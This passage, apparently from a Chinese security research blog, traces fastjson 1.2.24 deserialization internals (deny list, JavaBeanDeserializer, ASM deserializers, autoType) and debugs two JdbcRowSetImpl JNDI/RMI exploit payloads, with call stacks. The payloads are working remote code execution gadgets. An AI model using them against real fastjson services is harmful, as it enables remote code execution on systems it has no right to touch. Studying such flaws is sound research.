        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;WildcardType&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TypeVariable&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;||&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;type&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;instanceof&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ParameterizedType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;

        &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;derializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;//反序列化的类是否在denyList中&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getName&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;();&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;replace&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;sc&quot;&gt;'$'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;sc&quot;&gt;'.'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;denyList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
            &lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;deny&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;denyList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
            &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;startsWith&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;deny&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;
                &lt;span class=&quot;k&quot;&gt;throw&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JSONException&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;parser deny : &quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;className&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
            &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
        &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;之后还会根据一些情况进行匹配，在所有匹配均不成功后，就会创建一个新的deserializer&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801155439336.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;createJavaBeanDeserializer里，会根据asmEnable分两种情况去创建并返回一个JavaBeanDeserializer&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801175636270.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;如果目标class的父类中有非public的成员变量，则asmEnable为false，除此之外还有许多条件，如果不成立则asmEnable都为false&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801171446495.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;先跟进asm为false的情况，直接new一个JavaBeanDeserializer&lt;/p&gt;

&lt;h2 id=&quot;javabeandeserializer&quot;&gt;JavaBeanDeserializer&lt;/h2&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &lt;span class=&quot;c1&quot;&gt;//其中定义的一些成员变量&lt;/span&gt;
	&lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt;   &lt;span class=&quot;n&quot;&gt;fieldDeserializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldDeserializer&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sortedFieldDeserializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;protected&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt;            &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;kd&quot;&gt;final&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;JavaBeanInfo&lt;/span&gt;           &lt;span class=&quot;n&quot;&gt;beanInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;kd&quot;&gt;private&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;ConcurrentMap&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;extraFieldDeserializers&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;com.alibaba.fastjson.util.JavaBeanInfo#build 获取了目标类所生命的成员变量，方法，构造方法&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801162230691.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;最后返回一个JavaBeanInfo类&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801162539536.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;在JavaBeanInfo的构造方法中，除了一些基本的初始化，还会讲成员变量进行排序，生成一个sortedFields数组，不知道为什么要另外弄一个sortedFields&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kd&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;JavaBeanInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builderClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defaultConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;Constructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;?&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;creatorConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factoryMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;Method&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;JSONType&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonType&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;//&lt;/span&gt;
                        &lt;span class=&quot;nc&quot;&gt;List&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fieldList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;){&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;clazz&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;builderClass&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;builderClass&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;defaultConstructor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;defaultConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;creatorConstructor&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;creatorConstructor&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;factoryMethod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;factoryMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;parserFeatures&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;TypeUtils&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;getParserFeatures&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clazz&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;k&quot;&gt;this&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;buildMethod&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;buildMethod&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;省略&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.....&lt;/span&gt;

        &lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fieldList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;size&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;()];&lt;/span&gt;
        &lt;span class=&quot;n&quot;&gt;fieldList&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;toArray&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

        &lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sortedFields&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;nc&quot;&gt;FieldInfo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;];&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;System&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;arraycopy&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sortedFields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;fields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;
        &lt;span class=&quot;nc&quot;&gt;Arrays&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;sort&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sortedFields&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;);&lt;/span&gt;

    &lt;span class=&quot;o&quot;&gt;....&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;省略&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.....&lt;/span&gt;
   
    &lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;在JavaBeanDeserializer的构造函数中把刚刚返回的javaBeanInfo中的sortedFields和fields放到sortedFieldDeserializers和fieldDeserializers中&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801170946844.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;至此deserializer创建完成，在创建好deserializer后讲其放入自己的deserializers表中，然后开始进行反序列化&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172125235.png&quot; alt=&quot;&quot; /&gt;
fastjson-1.2.24-sources.jar!/com/alibaba/fastjson/parser/deserializer/JavaBeanDeserializer.java:349&lt;/p&gt;

&lt;p&gt;从这里开始按照上文提到的sortedFieldDeserializers的顺序进行扫描，并解析对应字段中的值&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172503527.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当找到对于字段相同，内容类型不同的，进一步进行解析，这里可以看到fastjson会对key值做判断，如果key值等于$ref或@type则会有特殊的处理&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172650015.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801172727278.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;之后继续跟进会来到这里com.alibaba.fastjson.parser.DefaultJSONParser#parse(java.lang.Object)&lt;/p&gt;

&lt;p&gt;判断当前指向的符号，如果是”{“则创建一个JSONObject继续解析&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801174009759.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;当作为JSONObject继续解析时，同样会对key做判断，如果是@type则会获取类名并加载&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801173758418.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;com.alibaba.fastjson.util.TypeUtils#loadClass(java.lang.String, java.lang.ClassLoader)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801173855503.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;之后会根据clazz获取deserializer进行反序列化&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801174629869.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;用asm来生成处理类的情况：&lt;/p&gt;

&lt;p&gt;也就是当asmEnable为true的情况&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801180314902.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;截一个代码随便看看，如果想看到摄功能成的处理类得抓出字节码然后反编译，感觉有点麻烦，所以就不弄了&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801202503290.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;为什么要有autotype功能&quot;&gt;为什么要有autoType功能&lt;/h2&gt;

&lt;p&gt;在分析组件的时候就在想如果没有autotype好像也没什么所谓，于是也搜了下我的疑问&lt;/p&gt;

&lt;p&gt;https://github.com/alibaba/fastjson/issues/3218&lt;/p&gt;

&lt;p&gt;当反序列化一个类包含了一个接口或者抽象类的时候，使用fastjson进行序列化的时候会将原来的类型抹去，只保留接口，使反序列化之后无法拿到原来的类型信息，加入autotype则可以指定类型，保留类型信息&lt;/p&gt;

&lt;h2 id=&quot;遇到的问题&quot;&gt;遇到的问题&lt;/h2&gt;

&lt;p&gt;测试的时候找了两个payload，大体都一样，只不过第一个payload比第二个多了反序列化java.lang.Class类的部分，导致第一个payload打不成功&lt;/p&gt;

&lt;p&gt;使用payload1&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;},\&quot;f\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;会报Caused by: java.lang.ArrayIndexOutOfBoundsException: -1&lt;/p&gt;

&lt;p&gt;调用栈&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;popContext:1256, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:358, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser)
parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser)
parseExtra:1490, DefaultJSONParser (com.alibaba.fastjson.parser)
parseField:766, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:639, DefaultJSONParser (com.alibaba.fastjson.parser)
parseObject:339, JSON (com.alibaba.fastjson)
parseObject:243, JSON (com.alibaba.fastjson)
parseObject:456, JSON (com.alibaba.fastjson)
main:41, test (test)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;看了一下，是因为执行这条语句是contextArrayIndex为0导致的&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/CitrusIce/blog_pic/master/image-20200801205641550.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;经过调试发现在最开始创建对象的时候会调用一次addContext，每次调用com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)会做一次popContext的操作，也就是每次解析JSONObject时都会调用一下，payload中有两个JSONObject，分别是&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;{&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;}&lt;/li&gt;
  &lt;li&gt;{&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;rmi://127.0.0.1:1099/adas&quot;,&quot;autoCommit&quot;:true}&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;所以导致数组越界&lt;/p&gt;

&lt;p&gt;再调试另一种payload&lt;/p&gt;

&lt;div class=&quot;language-java highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nc&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jsonString&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;{\&quot;name\&quot;:{\&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;rmi://127.0.0.1:1099/adas\&quot;,\&quot;autoCommit\&quot;:true}}&quot;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;少了一个JSONObject，所以popContext没有问题，同时又发现asm生成的类中有调用addContext的操作具体在&lt;/p&gt;

&lt;p&gt;deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)&lt;/p&gt;

&lt;p&gt;下面是调用堆栈&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;addContext:1280, DefaultJSONParser (com.alibaba.fastjson.parser)
setContext:1274, DefaultJSONParser (com.alibaba.fastjson.parser)
deserialze:-1, FastjsonASMDeserializer_1_JdbcRowSetImpl (com.alibaba.fastjson.parser.deserializer)
deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer)
parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser)
